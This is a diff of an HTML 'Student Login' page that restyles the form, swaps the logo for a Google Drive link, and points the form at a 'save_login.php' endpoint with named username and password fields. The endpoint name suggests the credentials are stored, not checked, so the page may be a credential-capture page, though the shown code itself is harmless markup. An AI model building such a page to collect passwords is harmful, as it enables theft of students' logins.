@@ -23,14 +23,15 @@
       width: 350px;
     }
     .login-container img {
-      width: 80px;
+      width: 120px; /* Increased logo size */
       margin-bottom: 15px;
     }
     .login-container h2 {
       margin-bottom: 25px;
       color: #333;
     }
-    .login-container input {
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
@@ -41,27 +42,55 @@
     .login-container button {
       width: 100%;
       padding: 12px;
-      background: #007BFF;
+      background: linear-gradient(45deg, #ff4b2b, #ff416c); /* Red gradient */
       color: white;
       font-size: 16px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
       margin-top: 10px;
+      transition: 0.3s;
     }
     .login-container button:hover {
-      background: #0056b3;
+      background: linear-gradient(45deg, #e60023, #ff1e56);
+    }
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 10px;
+      font-size: 13px;
+    }
+    .options label {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .options a {
+      text-decoration: none;
+      color: #007BFF;
+      font-size: 13px;
+    }
+    .options a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <!-- Replace logo.png with your logo file -->
-    <img src="https://assets.super.so/47fa140c-5512-4ac6-a02b-6305f7e083a9/uploads/logo/a44fb16b-1553-4cbf-aadc-e1c68c8784b6.png" alt="Logo">
+    <img src="https://drive.google.com/file/d/1Q4zTpB5gvI586pQQnjp4Ka8MUoFxRl2v/view?usp=sharing" alt="Logo">
     <h2>Student Login</h2>
-    <form>
-      <input type="text" placeholder="Username" required>
-      <input type="password" placeholder="Password" required>
+    <form action="save_login.php" method="POST">
+      <input type="text" name="username" placeholder="Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      
+      <div class="options">
+        <label>
+          <input type="checkbox" name="remember"> Remember Me
+        </label>
+        <a href="#">Forgot Password?</a>
+      </div>
+      
       <button type="submit">Login</button>
     </form>
   </div>
